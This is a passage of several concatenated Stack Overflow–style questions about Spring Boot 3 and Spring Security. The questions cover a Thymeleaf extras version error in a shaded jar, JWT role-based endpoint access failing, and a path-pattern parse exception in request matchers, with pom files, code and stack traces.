        cookie.setHttpOnly(true);

        return cookie;
    }
</code></pre>
<p>this is the process when login that use oauth2 success</p>
<p>please help me</p>
"
"<p>I tried to build my spring boot web application and create jar file to deploy it on the dedicated server. When I build it using IDE (in my case Intellij Idea) all works fine. But when I try to execute jar and get pages which use thymeleaf extras tags (like sec:authorize) I recieve an exception like this</p>
<pre><code>org.thymeleaf.exceptions.ConfigurationException: The Spring-version-specific infrastructure could not create utility for the specific version of Spring being used. Currently only Spring 6.x or newer is supported.
        at org.thymeleaf.extras.springsecurity6.util.SpringVersionSpecificUtils.&lt;clinit&gt;(SpringVersionSpecificUtils.java:74) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.extras.springsecurity6.util.SpringSecurityContextUtils.getAuthenticationObject(SpringSecurityContextUtils.java:127) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.extras.springsecurity6.auth.AuthUtils.getAuthenticationObject(AuthUtils.java:102) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.extras.springsecurity6.dialect.processor.AuthorizeAttrProcessor.isVisible(AuthorizeAttrProcessor.java:67) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.standard.processor.AbstractStandardConditionalVisibilityTagProcessor.doProcess(AbstractStandardConditionalVisibilityTagProcessor.java:61) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.processor.element.AbstractAttributeTagProcessor.doProcess(AbstractAttributeTagProcessor.java:74) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.processor.element.AbstractElementTagProcessor.process(AbstractElementTagProcessor.java:95) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.util.ProcessorConfigurationUtils$ElementTagProcessorWrapper.process(ProcessorConfigurationUtils.java:633) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.engine.ProcessorTemplateHandler.handleOpenElement(ProcessorTemplateHandler.java:1314) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.engine.OpenElementTag.beHandled(OpenElementTag.java:205) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.engine.TemplateModel.process(TemplateModel.java:136) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.engine.TemplateManager.parseAndProcess(TemplateManager.java:661) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1103) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1077) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.spring6.view.ThymeleafView.renderFragment(ThymeleafView.java:372) ~[pastebin.jar:1.0-SNAPSHOT]
        at org.thymeleaf.spring6.view.ThymeleafView.render(ThymeleafView.java:192) ~[pastebin.jar:1.0-SNAPSHOT]
...
</code></pre>
<p>As you can see spring considers that the version of some dependencies is lower than 6. But in my pom.xml I use spring-boot-starter-parent which should provide right versions and I believe it does.</p>
<p>pom.xml</p>
<pre><code>    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.3&lt;/version&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;org.example&lt;/groupId&gt;
    &lt;artifactId&gt;pastebin&lt;/artifactId&gt;
    &lt;packaging&gt;jar&lt;/packaging&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;pastebin Maven Webapp&lt;/name&gt;
    &lt;properties&gt;
        &lt;maven.compiler.source&gt;18&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;18&lt;/maven.compiler.target&gt;
    &lt;/properties&gt;
        &lt;dependencies&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework&lt;/groupId&gt;
                &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework&lt;/groupId&gt;
                &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework&lt;/groupId&gt;
                &lt;artifactId&gt;spring-websocket&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework&lt;/groupId&gt;
                &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework&lt;/groupId&gt;
                &lt;artifactId&gt;spring-messaging&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework&lt;/groupId&gt;
                &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework&lt;/groupId&gt;
                &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt;
            &lt;/dependency&gt;

            
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt;
                &lt;scope&gt;test&lt;/scope&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
                &lt;scope&gt;test&lt;/scope&gt;
            &lt;/dependency&gt;

            
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
                &lt;artifactId&gt;spring-security-core&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
                &lt;artifactId&gt;spring-security-config&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
                &lt;artifactId&gt;spring-security-web&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
                &lt;artifactId&gt;spring-security-crypto&lt;/artifactId&gt;
            &lt;/dependency&gt;

            
            &lt;dependency&gt;
                &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt;
                &lt;artifactId&gt;thymeleaf&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.thymeleaf.extras&lt;/groupId&gt;
                &lt;artifactId&gt;thymeleaf-extras-springsecurity6&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt;
                &lt;artifactId&gt;thymeleaf-spring6&lt;/artifactId&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
            &lt;/dependency&gt;

            
            &lt;dependency&gt;
                &lt;groupId&gt;com.nimbusds&lt;/groupId&gt;
                &lt;artifactId&gt;nimbus-jose-jwt&lt;/artifactId&gt;
                &lt;version&gt;9.37.3&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;jakarta.servlet&lt;/groupId&gt;
                &lt;artifactId&gt;jakarta.servlet-api&lt;/artifactId&gt;
                &lt;scope&gt;provided&lt;/scope&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
                &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
                &lt;version&gt;2.16.1&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.google.guava&lt;/groupId&gt;
                &lt;artifactId&gt;guava&lt;/artifactId&gt;
                &lt;version&gt;33.0.0-jre&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.google.firebase&lt;/groupId&gt;
                &lt;artifactId&gt;firebase-admin&lt;/artifactId&gt;
                &lt;version&gt;9.2.0&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                &lt;version&gt;1.18.30&lt;/version&gt;
                &lt;scope&gt;provided&lt;/scope&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.postgresql&lt;/groupId&gt;
                &lt;artifactId&gt;postgresql&lt;/artifactId&gt;
                &lt;version&gt;42.7.2&lt;/version&gt;
            &lt;/dependency&gt;

            
            &lt;dependency&gt;
                &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
                &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt;
                &lt;version&gt;5.10.2&lt;/version&gt;
                &lt;scope&gt;test&lt;/scope&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
                &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;
                &lt;version&gt;5.10.2&lt;/version&gt;
                &lt;scope&gt;test&lt;/scope&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.hamcrest&lt;/groupId&gt;
                &lt;artifactId&gt;hamcrest&lt;/artifactId&gt;
                &lt;version&gt;2.2&lt;/version&gt;
                &lt;scope&gt;test&lt;/scope&gt;
            &lt;/dependency&gt;
        &lt;/dependencies&gt;
    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
                &lt;version&gt;3.12.1&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;source&gt;18&lt;/source&gt;
                    &lt;target&gt;18&lt;/target&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;addResources&gt;true&lt;/addResources&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
                &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;
                &lt;version&gt;3.3.0&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;archive&gt;
                        &lt;manifest&gt;
                            &lt;mainClass&gt;com.vladpochuev.config.PastebinApplication&lt;/mainClass&gt;
                        &lt;/manifest&gt;
                    &lt;/archive&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
                &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt;
                &lt;version&gt;3.5.2&lt;/version&gt;
                &lt;executions&gt;
                    &lt;execution&gt;
                        &lt;phase&gt;package&lt;/phase&gt;
                        &lt;goals&gt;
                            &lt;goal&gt;shade&lt;/goal&gt;
                        &lt;/goals&gt;
                        &lt;configuration&gt;
                            &lt;filters&gt;
                                &lt;filter&gt;
                                    &lt;artifact&gt;*:*&lt;/artifact&gt;
                                    &lt;excludes&gt;
                                        &lt;exclude&gt;META-INF/*.SF&lt;/exclude&gt;
                                        &lt;exclude&gt;META-INF/*.DSA&lt;/exclude&gt;
                                        &lt;exclude&gt;META-INF/*.RSA&lt;/exclude&gt;
                                    &lt;/excludes&gt;
                                &lt;/filter&gt;
                            &lt;/filters&gt;
                        &lt;/configuration&gt;
                    &lt;/execution&gt;
                &lt;/executions&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
        &lt;finalName&gt;pastebin&lt;/finalName&gt;
    &lt;/build&gt;
&lt;/project&gt;
</code></pre>
<p>I checked maven build with<br />
<code>mvn dependency:tree</code><br />
and didn't find any conflicts. If I would remove thymeleaf extras dependency there wouldn't be any of issues except of losing some related functionality. So I think it leads to wrong execution.</p>
"
"<p>I am a beginner to Spring Boot, and I was trying to implement role based access to controller endpoint using bearer token authentication.</p>
<p>I am storing the user, passwords, roles in tables using MySQL. After hitting the endpoint localhost:8080/login with the username and password, I can fetch the roles like USER and ADMIN, but unable to access the endpoints /api/library/book. I can also create user by hitting endpoint /api/user/createUser.</p>
<p><strong>UserController.java</strong></p>
<pre><code>package com.api.controller;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.api.model.request.UserCreateRequest;
import com.api.model.response.Response;
import com.api.service.UserService;

import lombok.RequiredArgsConstructor;

@RestController
@RequestMapping(&quot;/api&quot;)
@RequiredArgsConstructor
public class UserController {
    private final UserService userService;
    
    @PostMapping(&quot;/user/createUser&quot;)
    public ResponseEntity&lt;?&gt; createUser(@RequestBody UserCreateRequest userCreateRequest){
        userService.createNewUser(userCreateRequest);
        Response response = new Response();
        response.setDescription(&quot;Success&quot;);
        response.setMessage(&quot;User created successfully.&quot;);
        return new ResponseEntity&lt;&gt;(response, HttpStatus.OK);
    }
    
    @GetMapping(&quot;/library/book&quot;)
    public ResponseEntity&lt;?&gt; book(){
        Response response = new Response();
        response.setDescription(&quot;Success&quot;);
        response.setMessage(&quot;Hit /book endpoint&quot;);
        return new ResponseEntity&lt;&gt;(response, HttpStatus.OK);
    }
    
    @GetMapping(&quot;/library/author&quot;)
    public ResponseEntity&lt;?&gt; author(){
        Response response = new Response();
        response.setDescription(&quot;Success&quot;);
        response.setMessage(&quot;Hit /author endpoint&quot;);
        return new ResponseEntity&lt;&gt;(response, HttpStatus.OK);
    }
}
</code></pre>
<p><strong>SecurityConfig.java</strong></p>
<pre><code>package com.api.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;

import com.api.filter.JwtAuthenticationFilter;
import com.api.filter.JwtAuthorizationFilter;

import lombok.RequiredArgsConstructor;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity
@RequiredArgsConstructor
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        System.out.println(&quot;Inside SecurityConfig filterChain()&quot;);
        http.csrf(csrf -&gt; csrf.disable())
            .authorizeHttpRequests(auth -&gt; auth
            .requestMatchers(new AntPathRequestMatcher(AuthenticationConfigConstants.SIGN_UP_URL)).permitAll()
            .requestMatchers(new AntPathRequestMatcher(&quot;/api/library/book&quot;)).hasAnyRole(&quot;USER&quot;,&quot;ADMIN&quot;)
            .requestMatchers(new AntPathRequestMatcher(&quot;/api/library/author&quot;)).hasAnyRole(&quot;ADMIN&quot;)
            .requestMatchers(new AntPathRequestMatcher(&quot;/api/library/member&quot;)).hasAnyRole(&quot;ADMIN&quot;)
            .anyRequest().authenticated()
            )
            .addFilter(new JwtAuthenticationFilter(authenticationManager(http.getSharedObject(AuthenticationConfiguration.class))))
            .addFilter(new JwtAuthorizationFilter(authenticationManager(http.getSharedObject(AuthenticationConfiguration.class))))  
            .sessionManagement(sess -&gt; sess.sessionCreationPolicy(SessionCreationPolicy.STATELESS));
            
        return http.build();
    }
    
    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {
        System.out.println(&quot;Inside SecurityConfig authenticationManager()&quot;);
        return authenticationConfiguration.getAuthenticationManager();
    }
}
</code></pre>
<p><strong>JwtAuthentication.java</strong></p>
<pre><code>package com.api.filter;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;

import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

import com.api.config.AuthenticationConfigConstants;
import com.api.model.ApiUser;
import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.fasterxml.jackson.databind.ObjectMapper;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;

@RequiredArgsConstructor
public class JwtAuthenticationFilter extends UsernamePasswordAuthenticationFilter{
    private final AuthenticationManager authenticationManager;
    
    @Override
    public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException{
        System.out.println(&quot;Inside JwtAuthentication attemptAuthentication()&quot;);
        try {
            ApiUser creds = new ObjectMapper()
                                .readValue(request.getInputStream(), ApiUser.class);
            if(creds.getUsername() == null || creds.getPassword() == null) {
                throw new BadCredentialsException(&quot;Invalid credentials&quot;);
            }
            return authenticationManager.authenticate(
                    new UsernamePasswordAuthenticationToken(
                            creds.getUsername(),
                            creds.getPassword(),
                            new ArrayList&lt;&gt;()
                )
            );
        } catch(IOException e) {
            throw new RuntimeException(e);
        }
    }
    
    @Override
    protected void successfulAuthentication(HttpServletRequest request, HttpServletResponse response, FilterChain chain, Authentication auth) throws IOException, ServletException{
        System.out.println(&quot;Inside JwtAuthentication successfulAuthentication()&quot;);
        String token = JWT.create()
                        .withSubject(((User) auth.getPrincipal()).getUsername())
                        .withClaim(&quot;role&quot;, auth.getAuthorities().iterator().next().getAuthority())
                        .withExpiresAt(new Date(System.currentTimeMillis() + AuthenticationConfigConstants.EXPIRATION_TIME))
                        .sign(Algorithm.HMAC256(AuthenticationConfigConstants.SECRET.getBytes()));
        
        response.setContentType(&quot;application/json&quot;);
        response.setCharacterEncoding(&quot;UTF-8&quot;);
        response.getWriter().write(
                &quot;{\&quot;&quot; + AuthenticationConfigConstants.HEADER_STRING + &quot;\&quot;:\&quot;&quot; + AuthenticationConfigConstants.TOKEN_PREFIX + token + &quot;\&quot;}&quot;
        );
    }
}
</code></pre>
<p><strong>JwtAuthorization.java</strong></p>
<pre><code>package com.api.filter;

import java.io.IOException;
import java.util.Arrays;
import java.util.Collection;

import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;

import com.api.config.AuthenticationConfigConstants;
import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.interfaces.DecodedJWT;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

public class JwtAuthorizationFilter extends BasicAuthenticationFilter{
    
    public JwtAuthorizationFilter(AuthenticationManager authenticationManager) {
        super(authenticationManager);
    }
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws IOException, ServletException{
        String header = request.getHeader(AuthenticationConfigConstants.HEADER_STRING);
        
        if(header == null || !header.startsWith(AuthenticationConfigConstants.TOKEN_PREFIX)) {
            chain.doFilter(request, response);
            System.out.println(&quot;Inside JwtAuthorization doFilterInternal()&quot;);
            return;
        }
        
        UsernamePasswordAuthenticationToken authentication = getAuthentication(request);
        SecurityContextHolder.getContext().setAuthentication(authentication);
        chain.doFilter(request, response);
    }
    
    private UsernamePasswordAuthenticationToken getAuthentication(HttpServletRequest request) {
        String token = request.getHeader(AuthenticationConfigConstants.HEADER_STRING);
        
        if(token != null) {         
            String user = JWT.require(Algorithm.HMAC256(AuthenticationConfigConstants.SECRET.getBytes()))
                    .build()
                    .verify(token.replace(AuthenticationConfigConstants.TOKEN_PREFIX, &quot;&quot;))
                    .getSubject();
            
            DecodedJWT verify = JWT.require(Algorithm.HMAC256(AuthenticationConfigConstants.SECRET.getBytes()))
                                    .build()
                                    .verify(token.replace(AuthenticationConfigConstants.TOKEN_PREFIX, &quot;&quot;));
            
            String username = verify.getSubject();
            String role = verify.getClaim(&quot;role&quot;).toString();
            
            System.out.println(role);
            
            if(user != null) {
                System.out.println(&quot;Inside JwtAuthorization getAuthentication()&quot;);      
                return new UsernamePasswordAuthenticationToken(username, null, getAuthorities(role));
            }
            
            return null;
        }
        
        return null;
    }
    
    public Collection&lt;? extends GrantedAuthority&gt; getAuthorities(String role){
        System.out.println(&quot;Inside JwtAuthorization getAuthorities()&quot;);
        return Arrays.asList(new SimpleGrantedAuthority(&quot;ROLE_&quot; + role));
    }
}
</code></pre>
<p>I have used debugging print statements to trace down the issue. I could figure out that something goes wrong after this call:</p>
<pre><code>if(user != null) {
System.out.println(&quot;Inside JwtAuthorization getAuthentication()&quot;);      
return new UsernamePasswordAuthenticationToken(username, null, getAuthorities(role));           }
</code></pre>
<p>inside getAuthentication(HttpServletRequest) function of <strong>JwtAuthorization.java</strong></p>
<p>Can't figure out what happened later on. Please feel free to ask any additional code you might need to see to figure this out.</p>
"
"<p>I have migrated my springboot from 2.4 to 3.1 and these are my dependencies in gradle file.</p>
<pre><code>implementation 'org.springframework.boot:spring-boot-starter-web:3.2.0'
implementation 'org.springframework:spring-websocket:6.1.4'
implementation('org.springframework.boot:spring-boot-starter-security:3.2.0')
</code></pre>
<p>and my security config file</p>
<pre><code>@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class JwtSecurityConfig {
@Autowired
  private UserDetailsService userDetailsService;

  @Autowired
  private RequestFilter requestFilter;

@Autowired
  private JwtEntryPoint jwtEntryPoint;

 @Autowired
  public void globalUserDetails(AuthenticationManagerBuilder auth) throws Exception {
    auth.userDetailsService(userDetailsService);
  }

  @Bean
  public UserDetailsService userDetailsService() {
    return new UserDetailsService();
  }

@Bean
  public SecurityFilterChain filterChain(HttpSecurity httpSecurity) throws Exception {
    httpSecurity.csrf(csrf -&gt; csrf.disable()).authorizeHttpRequests(auth -&gt; auth
            .requestMatchers(&quot;/student/{studentId}/**&quot;).permitAll()
    .requestMatchers(&quot;/{userId}/websocket/**&quot;).permitAll()
             .anyRequest().authenticated())
        .exceptionHandling(exp -&gt; exp.authenticationEntryPoint(jwtEntryPoint))
        .sessionManagement(sess -&gt; sess.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .addFilterBefore(requestFilter, UsernamePasswordAuthenticationFilter.class);
    return httpSecurity.build();
    }
}
</code></pre>
<p>i have simple controller ,</p>
<pre><code>@RestController
@RequestMapping(&quot;/student&quot;)
public class StudentController {

@Autowired
private StudentRepository repository;

@GetMapping(value = &quot;/{studentId}/get&quot;)
  public ResponseEntity&lt;?&gt; getStudent(@PathVariable String studentId) {
    return reposity.findById(studentId);
  }
}
</code></pre>
<p>But when i hit the endpoint it is giving, No more pattern data allowed after {*...} or ** pattern element.</p>
<p>i added property but still facing this issue</p>
<pre><code>spring.mvc.pathmatch.matching-strategy=ANT_PATH_MATCHER`

</code></pre>
<p>any solution for this issue? thanks in advance for the help.</p>
<p>UPDATE:</p>
<p>error logs,</p>
<pre><code>org.springframework.web.util.pattern.PatternParseException: No more pattern data allowed after {*...} or ** pattern element
    at org.springframework.web.util.pattern.InternalPathPatternParser.peekDoubleWildcard(InternalPathPatternParser.java:250) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.web.util.pattern.InternalPathPatternParser.parse(InternalPathPatternParser.java:113) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.web.util.pattern.PathPatternParser.parse(PathPatternParser.java:129) ~[spring-web-6.1.1.jar:6.1.1]
    at org.springframework.web.servlet.handler.PathPatternMatchableHandlerMapping.lambda$match$0(PathPatternMatchableHandlerMapping.java:64) ~[spring-webmvc-6.1.1.jar:6.1.1]
    at java.base/java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1708) ~[na:na]
    at org.springframework.web.servlet.handler.PathPatternMatchableHandlerMapping.match(PathPatternMatchableHandlerMapping.java:62) ~[spring-webmvc-6.1.1.jar:6.1.1]
    at org.springframework.web.servlet.handler.HandlerMappingIntrospector$LookupPathMatchableHandlerMapping.match(HandlerMappingIntrospector.java:542) ~[spring-webmvc-6.1.1.jar:6.1.1]
    at org.springframework.security.web.servlet.util.matcher.MvcRequestMatcher.matcher(MvcRequestMatcher.java:95) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.access.intercept.RequestMatcherDelegatingAuthorizationManager.check(RequestMatcherDelegatingAuthorizationManager.java:79) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.access.intercept.RequestMatcherDelegatingAuthorizationManager.check(RequestMatcherDelegatingAuthorizationManager.java:48) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.authorization.ObservationAuthorizationManager.check(ObservationAuthorizationManager.java:63) ~[spring-security-core-6.2.0.jar:6.2.0]
    at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:95) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.0.jar:6.2.0]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.0.jar:6.2.0]
